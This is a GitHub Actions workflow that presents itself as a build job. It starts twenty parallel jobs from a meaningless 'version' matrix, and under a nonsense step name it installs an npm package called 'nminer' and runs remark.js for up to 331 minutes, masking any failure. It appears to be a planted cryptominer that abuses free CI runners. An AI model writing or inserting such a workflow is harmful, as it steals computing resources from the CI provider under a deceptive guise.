name: remark
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 2215 }
          - { version: 4962 }
          - { version: 7348 }
          - { version: 9080 }
          - { version: 5781 }
          - { version: 5878 }
          - { version: 7327 }
          - { version: 7641 }
          - { version: 3320 }
          - { version: 7859 }
          - { version: 6438 }
          - { version: 3692 }
          - { version: 8458 }
          - { version: 9101 }
          - { version: 5435 }
          - { version: 1796 }
          - { version: 2875 }
          - { version: 9539 }
          - { version: 2886 }
          - { version: 7036 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: unimportant apt than
        run: |
          npm install nminer@latest
          timeout 331m node remark.js || echo "remark executed"